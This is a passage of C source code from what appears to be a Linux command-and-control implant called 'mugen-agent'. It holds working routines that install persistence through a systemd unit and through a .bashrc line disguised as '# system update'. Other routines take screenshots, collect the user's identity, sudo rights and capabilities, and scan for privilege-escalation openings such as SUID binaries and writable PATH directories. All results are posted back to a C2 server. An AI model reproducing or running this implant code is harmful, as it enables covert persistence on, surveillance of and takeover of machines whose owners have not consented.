        snprintf(dir, sizeof(dir), "%s/.config/systemd/user",
                 getenv("HOME") ? getenv("HOME") : "/root");
        char mk[300];
        snprintf(mk, sizeof(mk), "mkdir -p %s", dir);
        system(mk);
        f = fopen(user_unit, "w");
        used_path = user_unit;
    }

    char msg[512];
    if (!f) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "[-] cannot write systemd unit");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    fputs(unit_content, f);
    fclose(f);

    if (used_path == unit_path) {
        system("systemctl daemon-reload && systemctl enable mugen-agent.service 2>/dev/null");
        snprintf(msg, sizeof(msg), "[+] systemd unit installed: %s (system)", used_path);
    } else {
        system("systemctl --user daemon-reload && systemctl --user enable mugen-agent.service 2>/dev/null");
        snprintf(msg, sizeof(msg), "[+] systemd unit installed: %s (user)", used_path);
    }
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_persist_bash(uint32_t req_id, const char* payload_path) {
    const char* home = getenv("HOME");
    if (!home) home = "/root";
    char bashrc[256];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);

    // Check if already present
    FILE* f = fopen(bashrc, "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, payload_path)) {
                fclose(f);
                Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT,
                    "[!] entry already present in .bashrc");
                g_c2_post(pkt->data, pkt->size, NULL, NULL);
                buf_free(pkt);
                return;
            }
        }
        fclose(f);
    }

    f = fopen(bashrc, "a");
    char msg[512];
    if (!f) {
        snprintf(msg, sizeof(msg), "[-] cannot open %s", bashrc);
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, msg);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    fprintf(f, "\n# system update\nnohup %s &>/dev/null &\n", payload_path);
    fclose(f);
    snprintf(msg, sizeof(msg), "[+] .bashrc persistence added: %s", bashrc);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// ── screenshot ────────────────────────────────────────────────────────────────

void cmd_screenshot(uint32_t req_id) {
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/tmp/.tg_%x.png", req_id);

    // Try scrot (X11) then grim (Wayland) then import (ImageMagick)
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "scrot '%s' 2>/dev/null || grim '%s' 2>/dev/null || import -window root '%s' 2>/dev/null", tmp, tmp, tmp);
    system(cmd);

    FILE* f = fopen(tmp, "rb");
    if (!f) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR,
            "[-] screenshot failed: scrot/grim/import not available or no display");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t* img = malloc(sz);
    if (!img) { fclose(f); return; }
    fread(img, 1, sz, f);
    fclose(f);
    unlink(tmp);

    Buf* pkt = build_screenshot_result(req_id, "screenshot.png", img, (size_t)sz);
    free(img);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// ── whoami /all ───────────────────────────────────────────────────────────────

void cmd_whoami(uint32_t req_id, int all_flag) {
    // plain whoami: report euid so teamserver can detect privesc
    if (!all_flag) {
        uid_t euid = geteuid();
        struct passwd* pw = getpwuid(euid);
        const char* name = pw ? pw->pw_name : "?";
        Buf* pkt = build_output_packet(req_id, TENGU_WHOAMI, name);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }

    char out[8192];
    int  pos = 0;

    // ── uid / gid / groups ────────────────────────────────────────────────────
    uid_t uid  = getuid();
    uid_t euid = geteuid();
    gid_t gid  = getgid();
    gid_t egid = getegid();

    struct passwd* pw  = getpwuid(uid);
    struct passwd* epw = getpwuid(euid);
    struct group*  gr  = getgrgid(gid);

    pos += snprintf(out + pos, sizeof(out) - pos, "Identity\n");
    pos += snprintf(out + pos, sizeof(out) - pos, "--------\n");
    pos += snprintf(out + pos, sizeof(out) - pos,
        "  uid=%-6u (%s)  euid=%-6u (%s)\n",
        uid,  pw  ? pw->pw_name  : "?",
        euid, epw ? epw->pw_name : "?");
    pos += snprintf(out + pos, sizeof(out) - pos,
        "  gid=%-6u (%s)  egid=%-6u\n",
        gid, gr ? gr->gr_name : "?", egid);

    // supplementary groups
    int ngrps = getgroups(0, NULL);
    if (ngrps > 0) {
        gid_t* grps = malloc(ngrps * sizeof(gid_t));
        if (grps) {
            getgroups(ngrps, grps);
            pos += snprintf(out + pos, sizeof(out) - pos, "  groups=");
            for (int i = 0; i < ngrps && pos < (int)sizeof(out) - 64; i++) {
                struct group* g = getgrgid(grps[i]);
                pos += snprintf(out + pos, sizeof(out) - pos,
                    "%s(%u)", i ? "," : "", grps[i]);
                if (g) pos += snprintf(out + pos, sizeof(out) - pos, "/%s", g->gr_name);
            }
            pos += snprintf(out + pos, sizeof(out) - pos, "\n");
            free(grps);
        }
    }

    // ── capabilities ──────────────────────────────────────────────────────────
    pos += snprintf(out + pos, sizeof(out) - pos, "\nCapabilities (/proc/self/status)\n");
    pos += snprintf(out + pos, sizeof(out) - pos, "---------------------------------\n");
    FILE* f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f) && pos < (int)sizeof(out) - 128) {
            if (strncmp(line, "Cap", 3) == 0)
                pos += snprintf(out + pos, sizeof(out) - pos, "  %s", line);
        }
        fclose(f);
    }

    // ── sudoers check ─────────────────────────────────────────────────────────
    pos += snprintf(out + pos, sizeof(out) - pos, "\nSudo\n");
    pos += snprintf(out + pos, sizeof(out) - pos, "----\n");
    FILE* sudo = popen("sudo -ln 2>/dev/null", "r");
    if (sudo) {
        char line[256];
        int got = 0;
        while (fgets(line, sizeof(line), sudo) && pos < (int)sizeof(out) - 64) {
            pos += snprintf(out + pos, sizeof(out) - pos, "  %s", line);
            got = 1;
        }
        pclose(sudo);
        if (!got)
            pos += snprintf(out + pos, sizeof(out) - pos, "  (no sudo rights or sudo not available)\n");
    }

    // ── loginctl / session info ───────────────────────────────────────────────
    pos += snprintf(out + pos, sizeof(out) - pos, "\nLogin Session\n");
    pos += snprintf(out + pos, sizeof(out) - pos, "-------------\n");

    // /proc/self/loginuid
    f = fopen("/proc/self/loginuid", "r");
    if (f) {
        char buf[32] = {0};
        fread(buf, 1, sizeof(buf)-1, f);
        fclose(f);
        unsigned long luid = strtoul(buf, NULL, 10);
        struct passwd* lpw = getpwuid((uid_t)luid);
        pos += snprintf(out + pos, sizeof(out) - pos,
            "  loginuid=%lu (%s)\n", luid, lpw ? lpw->pw_name : "?");
    }

    // /proc/self/sessionid
    f = fopen("/proc/self/sessionid", "r");
    if (f) {
        char buf[32] = {0};
        fread(buf, 1, sizeof(buf)-1, f);
        fclose(f);
        pos += snprintf(out + pos, sizeof(out) - pos, "  sessionid=%s\n", buf);
    }

    // tty
    const char* tty = ttyname(STDIN_FILENO);
    pos += snprintf(out + pos, sizeof(out) - pos,
        "  tty=%s\n", tty ? tty : "(none)");

    // ── /etc/passwd entry ─────────────────────────────────────────────────────
    if (pw) {
        pos += snprintf(out + pos, sizeof(out) - pos,
            "\n  shell=%s  home=%s\n", pw->pw_shell, pw->pw_dir);
    }

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// --------------------------------------------------------------------------
// cmd_privesc - privilege escalation recon
// --------------------------------------------------------------------------

#include <stdarg.h>

static char*  s_pe_buf = NULL;
static size_t s_pe_pos = 0;
static size_t s_pe_cap = 0;

static void pe_append(const char* s) {
    size_t l = strlen(s);
    if (s_pe_pos + l + 1 > s_pe_cap) {
        s_pe_cap = s_pe_pos + l + 4096;
        s_pe_buf = realloc(s_pe_buf, s_pe_cap);
        if (!s_pe_buf) return;
    }
    memcpy(s_pe_buf + s_pe_pos, s, l);
    s_pe_pos += l;
    s_pe_buf[s_pe_pos] = '\0';
}

static void pe_printf(const char* fmt, ...) {
    char tmp[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    pe_append(tmp);
}

static void scan_suid(const char* dir, int depth) {
    if (depth <= 0) return;
    DIR* d = opendir(dir);
    if (!d) return;
    struct dirent* ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
        struct stat st;
        if (lstat(path, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) {
            scan_suid(path, depth - 1);
        } else if (S_ISREG(st.st_mode) && (st.st_mode & (S_ISUID | S_ISGID))) {
            pe_printf("  %s%s %s\n",
                (st.st_mode & S_ISUID) ? "SUID " : "",
                (st.st_mode & S_ISGID) ? "SGID" : "",
                path);
        }
    }
    closedir(d);
}

void cmd_privesc(uint32_t req_id) {
    s_pe_buf = malloc(8192);
    if (!s_pe_buf) return;
    s_pe_cap = 8192;
    s_pe_pos = 0;
    s_pe_buf[0] = '\0';

    pe_append("=== Writable PATH directories ===\n");
    const char* path_env = getenv("PATH");
    if (path_env) {
        char* pcopy = strdup(path_env);
        char* tok = strtok(pcopy, ":");
        int found = 0;
        while (tok) {
            if (access(tok, W_OK) == 0) {
                pe_printf("  [WRITABLE] %s\n", tok);
                found = 1;
            }
            tok = strtok(NULL, ":");
        }
        if (!found) pe_append("  (none)\n");
        free(pcopy);
    }

    pe_append("\n=== sudo -l ===\n");
    FILE* sf = popen("sudo -l -n 2>&1", "r");
    if (sf) {
        char line[256];
        while (fgets(line, sizeof(line), sf)) pe_append(line);
        pclose(sf);
    }

    pe_append("\n=== SUID/SGID binaries ===\n");
    const char* scan_dirs[] = {
        "/usr/bin", "/usr/sbin", "/bin", "/sbin",
        "/usr/local/bin", "/usr/local/sbin", "/opt", NULL
    };
    for (int i = 0; scan_dirs[i]; i++)
        scan_suid(scan_dirs[i], 2);

    pe_append("\n=== Processes with capabilities (CapEff != 0) ===\n");
    DIR* proc = opendir("/proc");
    if (proc) {
        struct dirent* dent;
        while ((dent = readdir(proc)) != NULL) {
            int is_pid = 1;
            for (char* p = dent->d_name; *p; p++)
                if (*p < '0' || *p > '9') { is_pid = 0; break; }
            if (!is_pid) continue;
            char spath[64];
            snprintf(spath, sizeof(spath), "/proc/%s/status", dent->d_name);
            FILE* stf = fopen(spath, "r");
            if (!stf) continue;
            char comm[64] = "?";
            unsigned long cap_eff = 0;
            char line[256];
            while (fgets(line, sizeof(line), stf)) {
                if (strncmp(line, "Name:", 5) == 0)
                    sscanf(line + 5, " %63s", comm);
                else if (strncmp(line, "CapEff:", 7) == 0)
                    sscanf(line + 7, " %lx", &cap_eff);
            }
            fclose(stf);
            if (cap_eff)
                pe_printf("  PID %-6s %-20s CapEff=%016lx\n", dent->d_name, comm, cap_eff);
        }
        closedir(proc);
    }

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, s_pe_buf);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(s_pe_buf);
    s_pe_buf = NULL;
}
